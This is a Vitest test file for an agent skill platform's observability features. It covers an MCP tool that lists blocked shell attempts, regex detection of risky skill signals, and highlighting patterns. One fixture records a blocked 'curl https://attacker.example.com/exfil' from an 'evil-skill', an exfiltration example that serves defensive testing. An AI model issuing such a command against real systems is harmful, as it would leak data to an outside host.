import { describe, it, expect } from "vitest";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { McpServer, type JsonRpcRequest } from "../src/mcp-server.js";
import { Scheduler } from "../src/scheduler.js";
import { FilesystemSkillStore } from "../src/connectors/skill-store.js";
import { FilesystemTraceStore, TraceBuilder } from "../src/trace.js";
import { Registry } from "../src/connectors/registry.js";

/**
 * v0.18.9 — Dashboard observability surfaces for the v0.18.8 shell
 * allowlist. Closes the original v0.18.8 dashboard half that didn't
 * land: the actual UI for operator's observe→promote loop.
 *
 * Three surfaces tested:
 *   1. `blocked_shell_attempts` MCP tool — cross-skill query
 *   2. Source-viewer security-signal collection (regex-based AST-light)
 *   3. Source-viewer highlighting regex correctness
 *
 * Dashboard rendering (HTML output) is tested at the regex level since
 * the SPA is vanilla JS without a unit-test framework wired; the regex
 * patterns ARE the testable behavior.
 */

// ────────────────────────────────────────────────────────────────────────
// (1) blocked_shell_attempts MCP tool — cross-skill query
// ────────────────────────────────────────────────────────────────────────

describe("v0.18.9 blocked_shell_attempts MCP tool", () => {
  it("returns empty list when no blocked attempts in trace store", async () => {
    const home = mkdtempSync(join(tmpdir(), "v0189-empty-"));
    try {
      const skillStore = new FilesystemSkillStore(join(home, "skills"));
      const traceStore = new FilesystemTraceStore(join(home, "traces"));
      const registry = new Registry();
      registry.registerSkillStore("primary", skillStore);
      const scheduler = new Scheduler({ registry, skillStore, traceStore });
      const server = new McpServer({ skillStore, scheduler, traceStore, registry });

      const req: JsonRpcRequest = {
        jsonrpc: "2.0",
        id: 1,
        method: "tools/call",
        params: { name: "blocked_shell_attempts", arguments: {} },
      };
      const resp = await server.handle(req);
      const wrapped = (resp.result as { content: Array<{ text: string }> }).content[0]!.text;
      const result = JSON.parse(wrapped) as { attempts: unknown[]; total: number };
      expect(result.attempts).toEqual([]);
      expect(result.total).toBe(0);
    } finally {
      rmSync(home, { recursive: true, force: true });
    }
  });

  it("surfaces trace ops with blocked_reason: binary-not-allowed", async () => {
    const home = mkdtempSync(join(tmpdir(), "v0189-blocked-"));
    try {
      const skillStore = new FilesystemSkillStore(join(home, "skills"));
      const traceStore = new FilesystemTraceStore(join(home, "traces"));
      // Hand-craft a trace record with a blocked op
      const builder = new TraceBuilder("evil-skill", "v1", { source: "inline", name: "", fired_at_ms: Date.now() });
      builder.recordOp({
        op_kind: "shell",
        target: "fetch",
        body: "curl https://attacker.example.com/exfil",
        started_at_ms: Date.now() - 5000,
        duration_ms: 1,
        errored: true,
        blocked_reason: "binary-not-allowed",
      });
      const trace = builder.finalize([], {}, [{
        target: "fetch",
        opKind: "shell",
        message: "binary 'curl' not allowed",
        class: "ShellBinaryNotAllowedError",
      }]);
      await traceStore.write(trace);

      const registry = new Registry();
      registry.registerSkillStore("primary", skillStore);
      const scheduler = new Scheduler({ registry, skillStore, traceStore });
      const server = new McpServer({ skillStore, scheduler, traceStore, registry });

      const req: JsonRpcRequest = {
        jsonrpc: "2.0",
        id: 1,
        method: "tools/call",
        params: { name: "blocked_shell_attempts", arguments: { limit: 10 } },
      };
      const resp = await server.handle(req);
      const wrapped = (resp.result as { content: Array<{ text: string }> }).content[0]!.text;
      const result = JSON.parse(wrapped) as {
        attempts: Array<{ skill_name: string; target: string; binary: string; body: string }>;
        total: number;
      };
      expect(result.total).toBe(1);
      expect(result.attempts[0]!.skill_name).toBe("evil-skill");
      expect(result.attempts[0]!.target).toBe("fetch");
      expect(result.attempts[0]!.binary).toBe("curl");
    } finally {
      rmSync(home, { recursive: true, force: true });
    }
  });

  it("identifies bash as the blocked binary for unsafe-shell pipelines", async () => {
    const home = mkdtempSync(join(tmpdir(), "v0189-unsafe-"));
    try {
      const skillStore = new FilesystemSkillStore(join(home, "skills"));
      const traceStore = new FilesystemTraceStore(join(home, "traces"));
      const builder = new TraceBuilder("pipeline-skill", "v1", { source: "inline", name: "", fired_at_ms: Date.now() });
      builder.recordOp({
        op_kind: "shell",
        target: "fetch",
        body: "curl https://api.example.com | jq '.data'",
        started_at_ms: Date.now(),
        duration_ms: 1,
        errored: true,
        blocked_reason: "binary-not-allowed",
      });
      const trace = builder.finalize([], {}, [{
        target: "fetch",
        opKind: "shell",
        message: "binary 'bash' not allowed",
        class: "ShellBinaryNotAllowedError",
      }]);
      await traceStore.write(trace);

      const registry = new Registry();
      registry.registerSkillStore("primary", skillStore);
      const scheduler = new Scheduler({ registry, skillStore, traceStore });
      const server = new McpServer({ skillStore, scheduler, traceStore, registry });

      const resp = await server.handle({
        jsonrpc: "2.0",
        id: 1,
        method: "tools/call",
        params: { name: "blocked_shell_attempts", arguments: {} },
      });
      const result = JSON.parse((resp.result as { content: Array<{ text: string }> }).content[0]!.text) as {
        attempts: Array<{ binary: string }>;
      };
      // Pipeline body → first-token heuristic identifies bash
      expect(result.attempts[0]!.binary).toBe("bash");
    } finally {
      rmSync(home, { recursive: true, force: true });
    }
  });

  it("respects limit + since_ms filters", async () => {
    const home = mkdtempSync(join(tmpdir(), "v0189-limit-"));
    try {
      const skillStore = new FilesystemSkillStore(join(home, "skills"));
      const traceStore = new FilesystemTraceStore(join(home, "traces"));
      // Write 3 traces, each with one blocked op
      for (let i = 0; i < 3; i++) {
        const builder = new TraceBuilder(`skill-${i}`, "v1", { source: "inline", name: "", fired_at_ms: Date.now() });
        builder.recordOp({
          op_kind: "shell",
          target: "t",
          body: `binary${i} arg`,
          started_at_ms: Date.now() + i,
          duration_ms: 1,
          errored: true,
          blocked_reason: "binary-not-allowed",
        });
        await traceStore.write(builder.finalize([], {}, [{
          target: "t",
          opKind: "shell",
          message: "blocked",
          class: "ShellBinaryNotAllowedError",
        }]));
      }
      const registry = new Registry();
      registry.registerSkillStore("primary", skillStore);
      const scheduler = new Scheduler({ registry, skillStore, traceStore });
      const server = new McpServer({ skillStore, scheduler, traceStore, registry });
      const resp = await server.handle({
        jsonrpc: "2.0",
        id: 1,
        method: "tools/call",
        params: { name: "blocked_shell_attempts", arguments: { limit: 2 } },
      });
      const result = JSON.parse((resp.result as { content: Array<{ text: string }> }).content[0]!.text) as { total: number };
      expect(result.total).toBe(2);
    } finally {
      rmSync(home, { recursive: true, force: true });
    }
  });
});

// ────────────────────────────────────────────────────────────────────────
// (2) Security-signal collection regex
// ────────────────────────────────────────────────────────────────────────

// Mirror the SPA's collectSecuritySignals shape so the test catches
// regex regressions even though the SPA itself isn't unit-tested.
function collectSecuritySignals(source: string) {
  const lines = source.split("\n");
  let shellOps = 0;
  let unsafeShell = 0;
  let autonomous = false;
  let approvedOps = 0;
  let writeOps = 0;
  let wakeAddresses = 0;
  let cronTriggers = 0;
  const shellBinaries = new Set<string>();
  for (const line of lines) {
    if (/^# Autonomous:\s*true\s*$/i.test(line)) autonomous = true;
    if (/^# Triggers:\s*cron:/i.test(line)) cronTriggers++;
    const shellMatch = /shell\s*\(\s*command\s*=\s*"([^"]+)"/.exec(line);
    if (shellMatch !== null) {
      shellOps++;
      const cmd = shellMatch[1]!.trim();
      const isUnsafe = /unsafe\s*=\s*true/.test(line);
      if (isUnsafe) {
        unsafeShell++;
        shellBinaries.add("bash");
      } else if (cmd.length > 0 && !cmd.startsWith("${") && !cmd.startsWith("$(")) {
        const binary = /^([^\s]+)/.exec(cmd);
        if (binary !== null) shellBinaries.add(binary[1]!);
      }
    }
    if (/approved\s*=\s*"/.test(line)) approvedOps++;
    if (/\$\s*skill_write\b|\$\s*data_write\b|file_write\s*\(/.test(line)) writeOps++;
    if (/notify\s*\(\s*agent\s*=\s*"[^"]*@[^"]*"/.test(line)) wakeAddresses++;
  }
  return {
    shellOps, unsafeShell, autonomous, approvedOps, writeOps,
    wakeAddresses, cronTriggers,
    shellBinaries: [...shellBinaries].sort(),
  };
}

describe("v0.18.9 security-signal collection", () => {
  it("clean skill has no signals", () => {
    const src = `# Skill: clean
# Status: Approved
m:
    emit(text="hello")
default: m
`;
    const sig = collectSecuritySignals(src);
    expect(sig.shellOps).toBe(0);
    expect(sig.unsafeShell).toBe(0);
    expect(sig.autonomous).toBe(false);
    expect(sig.writeOps).toBe(0);
  });

  it("flags shell ops + binaries", () => {
    const src = `# Skill: probe
# Status: Approved
m:
    shell(command="curl https://example.com") -> R
    shell(command="jq '.data'") -> S
default: m
`;
    const sig = collectSecuritySignals(src);
    expect(sig.shellOps).toBe(2);
    expect(sig.shellBinaries).toEqual(["curl", "jq"]);
  });

  it("flags unsafe shell + records bash as binary", () => {
    const src = `# Skill: probe
# Status: Approved
m:
    shell(command="curl ... | jq", unsafe=true) -> R
default: m
`;
    const sig = collectSecuritySignals(src);
    expect(sig.shellOps).toBe(1);
    expect(sig.unsafeShell).toBe(1);
    expect(sig.shellBinaries).toEqual(["bash"]);
  });

  it("flags # Autonomous: true", () => {
    const src = `# Skill: probe
# Status: Approved
# Autonomous: true
m:
    emit(text="hi")
default: m
`;
    const sig = collectSecuritySignals(src);
    expect(sig.autonomous).toBe(true);
  });

  it("flags approved=\"...\" per-op authorization", () => {
    const src = `# Skill: probe
# Status: Approved
m:
    $ data_write content="x" approved="cron-fired" -> R
default: m
`;
    const sig = collectSecuritySignals(src);
    expect(sig.approvedOps).toBe(1);
    expect(sig.writeOps).toBe(1);
  });

  it("flags wake-class @session deliveries", () => {
    const src = `# Skill: probe
# Status: Approved
m:
    notify(agent="perry@kitchen-terminal", message="look here")
    notify(agent="alice", message="mailbox")
default: m
`;
    const sig = collectSecuritySignals(src);
    expect(sig.wakeAddresses).toBe(1);
  });

  it("flags cron triggers", () => {
    const src = `# Skill: probe
# Status: Approved
# Triggers: cron: */5 * * * *
m:
    emit(text="hi")
default: m
`;
    const sig = collectSecuritySignals(src);
    expect(sig.cronTriggers).toBe(1);
  });

  it("composite skill flags multiple signals", () => {
    const src = `# Skill: risky
# Status: Approved
# Autonomous: true
# Triggers: cron: 0 * * * *
m:
    shell(command="curl https://api.example.com") -> R
    shell(command="echo $R | jq", unsafe=true) -> S
    $ data_write content="\${S}" approved="autonomous"
    notify(agent="perry@kitchen-terminal", message="done")
default: m
`;
    const sig = collectSecuritySignals(src);
    expect(sig.shellOps).toBe(2);
    expect(sig.unsafeShell).toBe(1);
    expect(sig.autonomous).toBe(true);
    expect(sig.approvedOps).toBe(1);
    expect(sig.writeOps).toBe(1);
    expect(sig.wakeAddresses).toBe(1);
    expect(sig.cronTriggers).toBe(1);
    expect(sig.shellBinaries).toEqual(["bash", "curl"]);
  });
});

// ────────────────────────────────────────────────────────────────────────
// (3) Highlighting-regex spot checks
// ────────────────────────────────────────────────────────────────────────

// Mirror the SPA's renderHighlightedSkillBody pattern shape (operates on
// the esc'd string — & " < > escaped). Tests catch regex regressions.
function highlightOnEscaped(body: string): { high: number; medium: number } {
  let counts = { high: 0, medium: 0 };
  const highPatterns = [
    /(^|\n)(# Autonomous:\s*true)/g,
    /(approved=&quot;[^&]*&quot;)/g,
    /(unsafe\s*=\s*true)/g,
    /(file_write\s*\()/g,
    /(\$\s*skill_write\b)/g,
    /(\$\s*data_write\b)/g,
  ];
  const mediumPatterns = [
    /(shell\s*\()/g,
    /(notify\s*\(\s*agent\s*=\s*&quot;[^&]*@[^&]*&quot;)/g,
  ];
  for (const re of highPatterns) {
    const matches = body.match(re);
    if (matches !== null) counts.high += matches.length;
  }
  for (const re of mediumPatterns) {
    const matches = body.match(re);
    if (matches !== null) counts.medium += matches.length;
  }
  return counts;
}

describe("v0.18.9 highlighting regex (esc'd-string operations)", () => {
  it("matches HIGH tier patterns on esc'd source", () => {
    // After esc(), " becomes &quot;
    const esc = `# Skill: t
# Autonomous: true
m:
    shell(command=&quot;echo&quot;, unsafe=true)
    $ data_write content=&quot;x&quot; approved=&quot;test&quot;
    file_write(path=&quot;/tmp/x&quot;, content=&quot;y&quot;)
    $ skill_write name=&quot;child&quot; source=&quot;...&quot;
default: m`;
    const counts = highlightOnEscaped(esc);
    // HIGH: Autonomous, unsafe=true, data_write, approved="test", file_write, skill_write = 6
    expect(counts.high).toBe(6);
  });

  it("matches MEDIUM tier on esc'd source", () => {
    const esc = `m:
    shell(command=&quot;echo&quot;)
    notify(agent=&quot;perry@kitchen-terminal&quot;, message=&quot;hi&quot;)
default: m`;
    const counts = highlightOnEscaped(esc);
    expect(counts.medium).toBe(2);
  });

  it("doesn't fire MEDIUM on bare notify (no @session)", () => {
    const esc = `m:
    notify(agent=&quot;perry&quot;, message=&quot;hi&quot;)
default: m`;
    const counts = highlightOnEscaped(esc);
    expect(counts.medium).toBe(0);
  });
});
